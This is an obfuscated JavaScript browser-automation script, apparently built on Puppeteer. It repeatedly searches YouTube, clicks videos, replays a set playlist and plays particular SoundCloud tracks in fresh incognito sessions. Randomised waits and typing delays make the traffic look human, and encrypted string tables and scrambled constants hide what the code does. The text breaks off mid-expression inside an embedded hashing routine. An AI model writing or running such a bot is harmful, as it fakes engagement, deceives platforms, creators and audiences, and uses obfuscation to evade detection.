const a2 = c,
  a1 = b,
  a0 = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x11ac + -0xee7 + 0xb1 * -0x4))) + i;
}
async function createPage(f, h) {
  const R = d;
  let i = await f['newPage']();
  return await i['setDefault' + R(0x9) + 'Timeout'](0x2b * -0x29 + -0x377 * -0xb + -0x1f3a), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  const S = b;
  return await f[S(0x6, '0#!F')](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xd918 * -0x1 + 0x65 * -0x1f7 + 0x1 * 0x214bb + (0x639 + 0x2e5 + -0x83f * -0x6) * random()) : await standardWaitForNetIdle(f), await wait(-0x1bc9 + 0xf65 + 0x1fec + (-0x1 * -0x332f + -0x42c0 + 0x36a1) * random()), -0x938 + -0x71 * -0x1 + 0x2 * 0x464;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x204a * -0x1 + 0x1a75 + 0x195d * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x63 * 0x5b + -0x7 * -0x388 + -0x3be8;
}
async function randomWait() {
  return await wait(0x52 * -0x6d + 0x1af * 0x6 + 0x2c * 0x102 + (-0x875 + -0x1d22 + 0x391f) * random()), -0x166b + -0x617 * -0x1 + 0x1055;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * 0x16e5 + 0xd2b * 0x2 + -0x3 * 0x1069, 0x1db1 + 0xf99 + 0x2d43 * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x56 * 0x67 + -0xe1c9 * -0x1 + 0x2b31) * getRandomInt(0x14 * -0xa6 + 0x23aa + -0x2d6 * 0x8, 0x32c + 0x4e8 * -0x2 + -0x37 * -0x1f), h)), -0x1c0b + 0x19c + 0x1a70;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x22d * -0x3 + -0xb6 * 0x7 + -0x18d * 0x1);
    let h = e[f];
    if (b['JoXmyH'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1a34 + 0xf30 + 0x2f * 0x3c, s, t, u = -0x14fc * 0x1 + -0x11 * -0xad + 0x97f; t = n['charAt'](u++); ~t && (s = r % (-0x1 * 0x134f + 0x1 * 0x11a1 + 0x1f * 0xe) ? s * (-0x1537 + -0x15ec + 0x2b63 * 0x1) + t : t, r++ % (0x2f * 0x46 + 0x1 * 0xde7 + -0x1abd)) ? p += String['fromCharCode'](-0xbef + 0x208d + -0x1 * 0x139f & s >> (-(-0xabb * 0x1 + -0x1 * 0x2174 + 0x2c31) * r & -0x4d * 0x54 + -0x49c * 0x2 + 0x2 * 0x1141)) : 0x204a * -0x1 + 0x1a75 + 0x5d5 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x63 * 0x5b + -0x7 * -0x388 + -0x3be9, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x52 * -0x6d + 0x1af * 0x6 + 0x10 * 0x18e))['slice'](-(-0x875 + -0x1d22 + 0x2599));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x166b + -0x617 * -0x1 + 0x1054,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0x16e5 + 0xd2b * 0x2 + -0x3 * 0x1069; u < 0x1db1 + 0xf99 + 0x2c4a * -0x1; u++) {
          p[u] = u;
        }
        for (u = -0x9 * 0x52 + -0x12d1 * -0x1 + -0xfef; u < 0x14 * -0xa6 + 0x23aa + -0x15b2 * 0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x32c + 0x4e8 * -0x2 + -0x146 * -0x6), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1c0b + 0x19c + 0x1a6f, q = 0x47c + -0x190d + 0x1491;
        for (let v = -0x247b + -0x20b1 + 0x452c; v < n['length']; v++) {
          u = (u + (0xbfd * -0x1 + 0x422 * -0x1 + 0x2 * 0x810)) % (-0x1 * -0x124f + 0xb55 * -0x1 + 0x22 * -0x2d), q = (q + p[u]) % (0x9e1 + -0xac9 + -0x1 * -0x1e8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xcf9 + -0x58 * -0x11 + 0x821)]);
        }
        return t;
      };
      b['iEjBEd'] = m, c = arguments, b['JoXmyH'] = !![];
    }
    const j = e[-0x954 + -0x4db * 0x1 + 0xe2f * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['pChuIg'] === undefined && (b['pChuIg'] = !![]), h = b['iEjBEd'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x47c + -0x190d + 0x1491;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x247b + -0x20b1 + 0x452d]['split']('\x20');
    for (let k = 0xbfd * -0x1 + 0x422 * -0x1 + 0x1 * 0x101f; k < i['length']; k += -0x1 * -0x124f + 0xb55 * -0x1 + 0x8 * -0xdf)
      j += i[k] * h[i[k + (0x9e1 + -0xac9 + -0x1 * -0xe9)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xcf9 + -0x58 * -0x11 + 0x727)['map'](l => Array['from'](l['children']))['flat'](-0x954 + -0x4db * 0x1 + 0x38c * 0x4)['map'](l => l['childNodes'][0x191f * -0x1 + -0xd80 + -0x1350 * -0x2][T(0x0)][-0x25fd * -0x1 + 0x7 * 0x516 + -0x4997]['childNodes'][-0x7 * -0x3cf + 0x11a * -0x1f + -0x89 * -0xe]['childNodes'][-0x10 * -0x145 + 0xb66 * -0x3 + 0xde2 * 0x1]['childNodes'][-0x1c67 + -0x1 * 0x188f + 0x34f7]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1a * 0x43 + 0x122f + -0x1515, 0x2 * -0x130a + 0xfd9 + -0x1 * -0x29c3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x4744 + 0x5a00 + 0x4 * 0x9f7);
  const h = await getMaxTime(f),
    i = Math['min']((0xc490 + 0x2f * -0x30c + -0x5a82 * -0x2) * getRandomInt(0x15ff + -0xc4d * -0x3 + -0x3ae4, -0x1813 + -0x19da + 0x31f2), h);
  return await wait(i), 0x8 * 0x387 + 0x268d + -0x2 * 0x2162;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x7f * -0x43 + 0x6b7 * -0x3 + -0xd18]['children'][-0x19 * 0x103 + 0x16cf + -0x6 * -0x6a]['children'][0x5 * -0x241 + -0x102b + -0x1 * -0x1b70]['children'][0x1 * 0xf2f + -0x1 * -0x23d3 + -0x3302]['children'][-0x1ea5 + 0x1136 * -0x1 + -0x1 * -0x2fdb]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x4d9 + -0x18f9 * 0x1 + 0x1dd3;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x13 * -0x1 + -0x2cc * 0xd + -0x24ad * -0x1 + (0x1 * 0x199a + -0x3b * 0x25 + -0x10e1) * random()
  }), await wait(0x1 * -0x50c + -0x199 * -0xb + -0xa93 * 0x1 + (0x806 + -0x59 * 0x3e + 0xeb4) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x4 * -0x688 + -0x7 * -0x2fb + -0x2efb * 0x1]['childNodes'][0x90b * 0x4 + -0x218c + -0x29f]['childNodes'][0x503 + -0x13 * -0x12e + 0x924 * -0x3]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1d3c * -0x1 + -0xcde + 0x29 * 0x107]['childNodes'][-0x97b * 0x3 + -0x18ee + -0xd * -0x41b]['childNodes'][0x1 * 0x14c4 + 0x1ffd + -0x34bf]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x147 * 0x1a + 0x1 * 0x1ac8 + 0x1b * 0x3d),
          r = 0x11b5 * 0x1 + -0xb39 * -0x1 + -0x1cee;
        for (let u = -0xdf5 * 0x1 + -0x63a + 0x142f; u < q['length']; u += -0x1e01 + 0x926 + -0x7 * -0x2fb)
          r += q[u] * k[q[u + (-0x82 + 0xa7a + -0x9f7)]];
        return r;
      }(n);
  });
  await wait((-0x7294 + 0x2 * 0x29f1 + 0x594a) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x29d * -0x4a + 0x4 * 0x4fbb + 0x6cd6) * getRandomInt(0x1a51 + 0x3ec * -0x3 + -0xe8c, -0xd29 + 0x37c + 0x9b7), h + (0x14dc + -0x1 * -0xab5 + -0x4f * 0x27));
  return await wait(i), 0xbbc + 0x13dc + -0x1f97;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x22d * -0x3 + -0xb6 * 0x7 + -0x18d * 0x1);
    let h = e[f];
    if (c['vsvcNF'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1a34 + 0xf30 + 0x2f * 0x3c, r, s, t = -0x14fc * 0x1 + -0x11 * -0xad + 0x97f; s = m['charAt'](t++); ~s && (r = q % (-0x1 * 0x134f + 0x1 * 0x11a1 + 0x1f * 0xe) ? r * (-0x1537 + -0x15ec + 0x2b63 * 0x1) + s : s, q++ % (0x2f * 0x46 + 0x1 * 0xde7 + -0x1abd)) ? o += String['fromCharCode'](-0xbef + 0x208d + -0x1 * 0x139f & r >> (-(-0xabb * 0x1 + -0x1 * 0x2174 + 0x2c31) * q & -0x4d * 0x54 + -0x49c * 0x2 + 0x2 * 0x1141)) : 0x204a * -0x1 + 0x1a75 + 0x5d5 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x63 * 0x5b + -0x7 * -0x388 + -0x3be9, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x52 * -0x6d + 0x1af * 0x6 + 0x10 * 0x18e))['slice'](-(-0x875 + -0x1d22 + 0x2599));
        }
        return decodeURIComponent(p);
      };
      c['xySKkn'] = i, b = arguments, c['vsvcNF'] = !![];
    }
    const j = e[-0x166b + -0x617 * -0x1 + 0x1054],
      k = f + j,
      l = b[k];
    return !l ? (h = c['xySKkn'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x2246 + -0x283 * 0x2 + 0x14 * 0x1f7), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2cc * -0x7 + -0x1 * -0x4c7 + -0x5 * 0x287 + (0x2 * 0x5a1 + 0x692 + -0xdec) * Math['random']());
    });
  }, -0x354f * 0x1 + -0x4 * 0x251 + 0x1df9 * 0x3);
  await wait(0x4f65a + -0x17ad1 * -0x1 + -0x1dd4b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x410c + -0x75c0 + 0x1a12c) * getRandomInt(0xb7b * -0x2 + -0x200f * 0x1 + 0x3709, 0xa20 + -0xc89 + 0x282)), clearInterval(h), -0xe66 + -0x1 * -0xc44 + 0x223;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x3 * -0x8fb + -0x608 + 0x20f9;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x75 * 0xf + 0x3ab * 0x7 + -0x2087;
    await randomWait();
  }
  return 0xd * -0x153 + -0x1fc8 + 0xc4 * 0x40;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1 * -0x1ff3 + -0x6c * 0x47 + -0x1ff * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x168a + 0x1 * 0xc56 + -0x28d * -0x4 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x22d * -0x3 + -0xb6 * 0x7 + -0x18d * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x23a2 * 0x1 + 0x733 * -0x2 + 0x9 * -0x25c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + U(0xf, 'wyNK')](),
        k = await j['newPage']();
      let l = -0x2d2 + -0x1468 + 0x173a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const V = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + V(0x11) + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * -0x3c13 + 0x400b * -0x4 + 0x1 * 0x1ec07 + getRandomInt(0x792 + 0x3e90 + -0xb8a, 0x6f1 * 0xb + -0xa * 0x454 + 0x541d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xc3 * 0x26 + -0x5b + 0x1d4e), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * 0x1dc9 + 0x88c + 0x1 * -0x2655;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x119e + -0x1c43 + 0xaa5, 0xe * -0x67 + -0x357 + 0x92b)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x223b + 0xae + 0x1 * 0x295d + floor((0x193 * -0x14 + 0x1512 + 0xe52) * random()))), log('p2'), log(await s['evaluate'](() => {
        const X = b,
          W = c;
        var w, x, y, z, A, B, C, D, E = W(0x1b) == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xb0e4c422 * 0x1 + 0x5a63650e + -0x223 * -0x6463dc),
          -0x9837 * 0x106 + 0x7cdd20 + -0x12 * -0x8d42d,
          -0x1 * 0x4885 + 0x787 * -0x17 + 0xd * 0x1cbe,
          -0x2 * 0x10b4 + -0x3e1 + 0x25c9
        ], y = [
          -0x1faa + -0x4 * 0x8f3 + 0x438e * 0x1,
          0xa1b + 0x16fd + -0x2108,
          0x1 * 0xcc5 + -0x16a2 + 0x9e5,
          -0x2 * -0x4c1 + -0x31b * -0x4 + 0x2 * -0xaf7
        ], z = [
          'hex',
          X(0x10, '6YTp'),
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1a5f + 0x6b * 0x1d + 0xa7 * -0x3b)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x30 * 0x7f + 0x13f0 + 0xf8 * 0x4; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const Y = c;
              if ('string' == typeof N)
                return K['createHash'](Y(0x7))['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xb1 * 0x2b + -0xe1b * 0x2 + 0x39f1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * -0x2037 + 0xc7 * -0xb + 0x28c4] = A[0x6c6 * -0x5 + 0x1bcb + 0x623] = A[0x5fb * 0x1 + -0x24b5 + 0x1ebb] = A[-0xf77 + -0x249d + 0x3416] = A[0x22f3 * 0x1 + 0x5 * 0x57b + -0x3e57] = A[-0x1 * -0xab + -0x16 * -0x35 + 0x2b * -0x1f] = A[0x15a6 + -0x1 * -0x232e + 0x38cf * -0x1] = A[0x2291 + 0xfd3 * 0x2 + -0x4231] = A[-0x1 * 0xf0d + 0x1b42 + 0x1 * -0xc2e] = A[-0x3 * -0x838 + 0x1f * 0x59 + -0x2367] = A[0x238d + -0xf9d * 0x1 + -0x13e7] = A[-0x25de + 0x1f08 * 0x1 + 0x20 * 0x37] = A[0x257b + 0x5ec * 0x3 + 0x1 * -0x3734] = A[-0x14 * 0x130 + 0x1c9 * -0x3 + 0x1d27] = A[-0x1 * 0x488 + 0x3d * 0x16 + 0x1 * -0xa9] = A[-0xf15 + 0x872 + 0x6b1 * 0x1] = A[0xd * 0x290 + -0x6 * -0x446 + -0x3ae5] = -0x118d * -0x2 + 0x2710 + -0x4a2a, this['blocks'] = A) : this['blocks'] = [
                0x1fd7 + -0xa9f + -0x184 * 0xe,
                -0x1a1d + 0x1 * 0x5bf + 0x6ca * 0x3,
                -0x1 * 0x196c + 0xd6 * -0x2c + 0x3e34,
                -0x988 + 0x24e9 + -0x1b61,
                -0x1e1f + -0x1 * 0x25a0 + -0x787 * -0x9,
                -0x1 * -0x15fe + 0x3 * 0x34a + 0x2 * -0xfee,
                0x1204 + -0x18c2 + 0x6be,
                -0x6dd * -0x5 + -0xa4a + -0x1807,
                -0xcff + -0x1 * 0x1169 + 0x22c * 0xe,
                -0xa5b * 0x1 + -0x6a * 0x25 + 0x19ad,
                0x1 * -0x1f42 + 0x313 + -0x6f * -0x41,
                0x25b4 + -0x2443 + -0x171,
                0x22e4 + -0x38b * 0x4 + -0x9c * 0x22,
                0x2d + 0x1fb2 + -0x1fdf,
                -0x1ab3 + -0x1d86 + 0x3839,
                -0x20a3 + -0x7 * -0x265 + 0xfe0,
                -0x1 * 0xe56 + 0x598 + 0x8be * 0x1
              ], this['h0'] = -0xc547ee2a + -0x3adb843d + 0x167689568, this['h1'] = 0x1 * -0x119566f4e + 0x17b2bada2 + 0x8df86d35, this['h2'] = -0xa * -0xb0c96f6 + 0x12465fee3 * 0x1 + 0x13 * -0xd2a949b, this['h3'] = -0x125bd5b2 + 0x1dbd131c + 0x4d1170c, this['h4'] = -0x3aa43197 * 0x3 + 0x74e01a68 + 0x15cea97 * 0xbb, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x176 + 0x8 * 0x1f7 + -0x112e, this['finalized'] = this['hashed'] = 0xca2 + 0x1bd + 0x11b * -0xd, this['first'] = 0x1 * -0xc74 + 0x240b + -0x1796;
            }
            ['update'](J) {
              const Z = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0x85d + -0x21 * -0xee + -0x1651, O = J['length'] || -0x658 + 0x2 * -0xc29 + -0x2 * -0xf55, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * 0x7ef + 0x2099 + -0xc55 * 0x2, P[-0xad0 + 0xf9e + 0x19a * -0x3] = this['block'], P[0x47 * -0x25 + -0x1ea5 + -0x2 * -0x147c] = P[-0x1332 + 0x26b0 + -0x137d] = P[0x1 * 0x16d1 + -0x15c5 + -0x10a] = P[-0x1 * -0x18e5 + 0x3 * -0xadf + 0x1 * 0x7bb] = P[-0x1f3c + -0x1 * 0x14c6 + 0x1a03 * 0x2] = P[0x6e3 + 0x147a + 0x2 * -0xdac] = P[0xc4f + -0x86 * 0x4 + -0xa31] = P[0x7c * -0x21 + 0xad6 + 0x35 * 0x19] = P[-0xa06 + 0x2291 + -0x19 * 0xfb] = P[0x19a0 + 0xd27 + 0x135f * -0x2] = P[0x4b1 * 0x2 + 0x8c6 + -0x121e] = P[0x11a * -0xc + 0x32 * -0x67 + 0x2161] = P[0xc95 + -0x6c2 * 0x2 + 0x1 * 0xfb] = P[-0x1a3 + -0x22be + 0x2 * 0x1237] = P[0x14a + 0x19fd + -0x1b39] = P[0x176 + -0x19c8 + -0x1 * -0x1861] = 0x2bd * -0x5 + 0x2352 + -0x15a1), K) {
                    for (N = this['start']; M < O && N < -0x6b0 + 0x1eea + -0x17fa; ++M)
                      P[N >> -0x180c + 0x11a + 0x16f4] |= J[M] << y[-0x7b * 0x1 + -0x1 * -0x17d1 + -0x1753 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xd * -0x152 + 0x198a + 0x2c * -0xf7; ++M)
                      (L = J['charCodeAt'](M)) < -0x1837 + 0x124b + 0x66c ? P[N >> 0xe56 + -0x1eb1 + 0x105d] |= L << y[-0x180c + -0x23bc + 0x1 * 0x3bcb & N++] : L < 0x2 * 0x10c9 + -0x1369 * -0x1 + 0x2cfb * -0x1 ? (P[N >> -0x1383 + 0xb * 0x2a5 + 0xe * -0xaf] |= (0x1245 + -0x1721 + -0x1 * -0x59c | L >> 0x1 * -0x21ab + -0x511 + 0x26c2) << y[0x118b + -0x7 * 0x4c3 + -0xfcd * -0x1 & N++], P[N >> -0xe41 + -0x1ac8 + -0x13 * -0x229] |= (0x1 * -0x22a5 + 0x11b * 0xe + 0x13ab | 0x2a7 * 0x3 + -0xbdc + 0x426 & L) << y[0x2b * 0xaa + -0x2 * -0x304 + -0x2293 * 0x1 & N++]) : L < 0x7fe7 + -0x13b22 + 0x1933b || L >= -0x1bd23 + 0x159ca + -0x17 * -0xe0f ? (P[N >> -0x2 * 0xcca + 0x2f * 0x4b + 0x1 * 0xbd1] |= (0xbd6 + 0x2121 + -0x2c17 * 0x1 | L >> 0xc0e + 0x22c9 + -0x2ecb) << y[-0x213f + 0x84 + 0x105f * 0x2 & N++], P[N >> 0x3cd * 0x3 + 0x35f * -0xb + 0x66c * 0x4] |= (0x1f2d * 0x1 + -0x685 + -0x1828 | L >> -0x7f * 0x9 + 0x277 + 0x7 * 0x4a & -0x201e + -0x94a + -0x1 * -0x29a7) << y[-0x8 * -0x1f + 0x3 * -0xa87 + 0x1ea0 & N++], P[N >> 0x3f1 * 0x3 + 0x2501 * 0x1 + 0x3 * -0x1046] |= (0x1bb * 0xd + -0x65b + -0xfa4 | 0x8ee + 0x18 * 0x117 + -0x22d7 & L) << y[-0x1eee + 0x1d63 + -0x18e * -0x1 & N++]) : (L = 0x74bf * -0x2 + 0x15cfe + 0x8c80 + ((-0x5a5 + 0x21ea + -0xef * 0x1a & L) << -0xd5b + -0x11aa + 0x1f0f | -0x2 * 0xb3c + 0x745 * -0x1 + 0x21bc & J['charCodeAt'](++M)), P[N >> 0x211f + -0x2 * 0x7bb + -0x11a7] |= (-0x2 * 0x59b + 0x178c + 0xb66 * -0x1 | L >> -0x1d23 * -0x1 + -0x1 * -0xac5 + -0x2 * 0x13eb) << y[0x1 * 0x12a3 + 0xb91 + -0x1e31 & N++], P[N >> -0x1f51 * -0x1 + -0xc * -0x2f0 + -0x428f] |= (0x2f * 0x2a + -0x10d0 + 0x99a | L >> 0xaab * 0x3 + -0x1ad0 + 0x3 * -0x1b7 & -0x13d3 + 0x3 * -0x9e1 + 0x31b5) << y[-0xd43 * 0x1 + 0x1 * 0x25d9 + -0x1893 & N++], P[N >> 0xf7e + -0x24ae + 0x1532] |= (0x4d0 * 0x2 + 0xa * 0x16d + -0x1762 | L >> -0x45b + -0x3ae + 0x80f & 0x14b1 + 0x1 * 0x1f15 + 